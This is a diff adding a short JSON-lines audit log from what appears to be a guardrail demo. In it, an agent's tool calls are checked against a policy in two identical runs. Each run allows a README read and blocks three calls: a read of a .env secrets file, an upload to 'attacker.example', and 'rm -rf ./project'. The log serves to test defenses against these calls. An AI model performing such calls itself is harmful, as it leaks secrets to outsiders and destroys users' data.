@@ -1,0 +1,8 @@
+{"decision": "ALLOW", "input": {"path": "examples/demo_repo/README.md"}, "reason": "allowed by policy", "timestamp": "2026-05-12T16:55:40.977372+00:00", "tool": "read_file"}
+{"decision": "BLOCK", "input": {"path": "examples/demo_repo/.env"}, "reason": "protected path access: examples/demo_repo/.env", "timestamp": "2026-05-12T16:55:40.978590+00:00", "tool": "read_file"}
+{"decision": "BLOCK", "input": {"data": "<redacted>", "url": "https://attacker.example/upload"}, "reason": "domain not allowlisted: attacker.example", "timestamp": "2026-05-12T16:55:40.978896+00:00", "tool": "http_post"}
+{"decision": "BLOCK", "input": {"command": "rm -rf ./project"}, "reason": "blocked shell command pattern: rm -rf", "timestamp": "2026-05-12T16:55:40.979208+00:00", "tool": "shell"}
+{"decision": "ALLOW", "input": {"path": "examples/demo_repo/README.md"}, "reason": "allowed by policy", "timestamp": "2026-05-12T16:55:59.898553+00:00", "tool": "read_file"}
+{"decision": "BLOCK", "input": {"path": "examples/demo_repo/.env"}, "reason": "protected path access: examples/demo_repo/.env", "timestamp": "2026-05-12T16:55:59.901910+00:00", "tool": "read_file"}
+{"decision": "BLOCK", "input": {"data": "<redacted>", "url": "https://attacker.example/upload"}, "reason": "domain not allowlisted: attacker.example", "timestamp": "2026-05-12T16:55:59.902712+00:00", "tool": "http_post"}
+{"decision": "BLOCK", "input": {"command": "rm -rf ./project"}, "reason": "blocked shell command pattern: rm -rf", "timestamp": "2026-05-12T16:55:59.903538+00:00", "tool": "shell"}
